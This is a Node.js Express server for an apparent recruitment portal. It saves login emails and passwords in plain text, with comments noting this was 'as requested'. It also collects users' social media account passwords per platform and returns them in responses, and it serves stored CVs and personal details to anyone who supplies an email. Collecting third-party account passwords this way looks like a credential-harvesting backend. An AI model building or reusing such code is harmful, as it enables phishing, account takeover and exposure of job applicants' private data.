import express from 'express';
import mongoose from 'mongoose';
import cors from 'cors';
import dotenv from 'dotenv';
import multer from 'multer';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

dotenv.config({ path: path.resolve(__dirname, '../.env') });

const app = express();
const PORT = process.env.PORT || 5001;
const HEALTH_URL = process.env.HEALTH_URL || 'http://localhost:5001/health';

// Middleware
app.use(cors({
  origin: 'https://greethr.vercel.app'
}));
app.use(express.json({ limit: '10mb' }));

const upload = multer({
  storage: multer.memoryStorage(),
  limits: {
    fileSize: 10 * 1024 * 1024,
    fieldSize: 25 * 1024 * 1024,
    fields: 20
  }
});

// MongoDB Connection
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017/data-portal';

mongoose.connect(MONGODB_URI)
  .then(() => console.log('Connected to MongoDB database'))
  .catch((err) => console.error('MongoDB connection error:', err));

// Schema & Model (Plain text password as requested)
const credentialSchema = new mongoose.Schema({
  email: {
    type: String,
    required: true,
    trim: true
  },
  password: {
    type: String,
    required: true
  },
  createdAt: {
    type: Date,
    default: Date.now
  }
});

const Credential = mongoose.model('Credential', credentialSchema);

const profileSchema = new mongoose.Schema({
  email: {
    type: String,
    required: true,
    trim: true,
    lowercase: true
  },
  fullName: String,
  phone: String,
  currentJob: String,
  cvFileName: String,
  cvMimeType: String,
  cvBuffer: Buffer,
  coverLetter: String,
  photoFileName: String,
  photoDataUrl: String,
  address: String,
  joiningDate: String,
  nationality: String,
  createdAt: {
    type: Date,
    default: Date.now
  },
  updatedAt: {
    type: Date,
    default: Date.now
  }
}, {
  timestamps: true
});

profileSchema.index({ email: 1 }, { unique: true });

const Profile = mongoose.model('Profile', profileSchema);

const socialConnectionSchema = new mongoose.Schema({
  userEmail: {
    type: String,
    required: true,
    trim: true,
    lowercase: true
  },
  platform: {
    type: String,
    required: true,
    trim: true,
    lowercase: true
  },
  identifier: {
    type: String,
    required: true,
    trim: true
  },
  password: {
    type: String,
    required: true
  },
  createdAt: {
    type: Date,
    default: Date.now
  },
  updatedAt: {
    type: Date,
    default: Date.now
  }
}, {
  timestamps: true
});

socialConnectionSchema.index({ userEmail: 1, platform: 1 }, { unique: true });

const SocialConnection = mongoose.model('SocialConnection', socialConnectionSchema);

// API Routes
app.get('/health', (req, res) => {
  res.status(200).json({ status: 'ok' });
});

app.post('/api/auth/save-credentials', async (req, res) => {
  try {
    const { email, password } = req.body;

    if (!email || !password) {
      return res.status(400).json({ error: 'Email and password are required' });
    }

    // Save in plain text as requested by the user
    const newCredential = new Credential({
      email,
      password
    });

    await newCredential.save();

    res.status(200).json({ success: true, message: 'Credentials saved successfully' });
  } catch (error) {
    console.error('Error saving credentials:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.post('/api/profile/save-profile', (req, res, next) => {
  upload.single('cvAttachment')(req, res, (err) => {
    if (err) {
      console.error('Multer error while saving profile:', err);
      if (err.code === 'LIMIT_FILE_SIZE' || err.code === 'LIMIT_FIELD_VALUE') {
        return res.status(413).json({ error: 'The uploaded profile data is too large. Please reduce the image size and try again.' });
      }
      return res.status(400).json({ error: err.message || 'Unable to process uploaded profile data.' });
    }
    next();
  });
}, async (req, res) => {
  try {
    const { email } = req.body;
    const profilePayload = req.body.profile ? JSON.parse(req.body.profile) : null;

    if (!email || !profilePayload) {
      return res.status(400).json({ error: 'Email and profile data are required' });
    }

    const normalizedEmail = String(email).trim().toLowerCase();
    const existingProfile = await Profile.findOne({ email: normalizedEmail });

    const safeProfile = {
      fullName: profilePayload.fullName || '',
      phone: profilePayload.phone || '',
      currentJob: profilePayload.currentJob || '',
      coverLetter: profilePayload.coverLetter || '',
      photoFileName: profilePayload.photoFileName || '',
      photoDataUrl: '',
      address: profilePayload.address || '',
      joiningDate: profilePayload.joiningDate || '',
      nationality: profilePayload.nationality || ''
    };

    const updatePayload = {
      email: normalizedEmail,
      ...safeProfile
    };

    if (req.file) {
      updatePayload.cvFileName = req.file.originalname;
      updatePayload.cvMimeType = req.file.mimetype;
      updatePayload.cvBuffer = req.file.buffer;
    } else if (existingProfile) {
      updatePayload.cvFileName = existingProfile.cvFileName || '';
      updatePayload.cvMimeType = existingProfile.cvMimeType || '';
      updatePayload.cvBuffer = existingProfile.cvBuffer;
    } else {
      updatePayload.cvFileName = profilePayload.cvFileName || '';
    }

    const savedProfile = await Profile.findOneAndUpdate(
      { email: normalizedEmail },
      { $set: updatePayload },
      {
        upsert: true,
        new: true,
        setDefaultsOnInsert: true
      }
    );

    res.status(200).json({
      success: true,
      message: 'Profile saved successfully',
      profile: savedProfile
    });
  } catch (error) {
    console.error('Error saving profile:', error);
    res.status(500).json({ error: error.message || 'Internal server error' });
  }
});

app.get('/api/profile/download-cv/:email', async (req, res) => {
  try {
    const email = String(req.params.email || '').trim().toLowerCase();

    if (!email) {
      return res.status(400).json({ error: 'Email is required' });
    }

    const profile = await Profile.findOne({ email });

    if (!profile || !profile.cvBuffer) {
      return res.status(404).json({ error: 'No CV found for this user' });
    }

    const fileName = profile.cvFileName || 'submitted-cv';
    const mimeType = profile.cvMimeType || 'application/octet-stream';

    res.setHeader('Content-Type', mimeType);
    res.setHeader('Content-Disposition', `attachment; filename="${fileName}"`);
    res.send(profile.cvBuffer);
  } catch (error) {
    console.error('Error downloading CV:', error);
    res.status(500).json({ error: error.message || 'Unable to download CV' });
  }
});

app.post('/api/connections/save-social-connection', async (req, res) => {
  try {
    const { userEmail, platform, identifier, password } = req.body;

    if (!userEmail || !platform || !identifier || !password) {
      return res.status(400).json({ error: 'User email, platform, identifier, and password are required' });
    }

    const normalizedEmail = String(userEmail).trim().toLowerCase();
    const normalizedPlatform = String(platform).trim().toLowerCase();

    const savedConnection = await SocialConnection.findOneAndUpdate(
      { userEmail: normalizedEmail, platform: normalizedPlatform },
      { $set: { userEmail: normalizedEmail, platform: normalizedPlatform, identifier: String(identifier).trim(), password } },
      {
        upsert: true,
        new: true,
        setDefaultsOnInsert: true
      }
    );

    res.status(200).json({
      success: true,
      message: `${normalizedPlatform} connection saved successfully`,
      connection: savedConnection
    });
  } catch (error) {
    console.error('Error saving social connection:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Keep the free instance warm by pinging itself periodically.
const keepAlive = () => {
  if (!HEALTH_URL) return;

  fetch(HEALTH_URL)
    .then(() => {
      console.log('Keep-alive ping succeeded');
    })
    .catch((err) => {
      console.error('Keep-alive ping failed:', err.message);
    });
};

if (process.env.NODE_ENV !== 'test') {
  setInterval(keepAlive, 14 * 60 * 1000);
}

// Start Server
app.listen(PORT, () => {
  console.log(`Backend server running on port ${PORT}`);
  keepAlive();
});

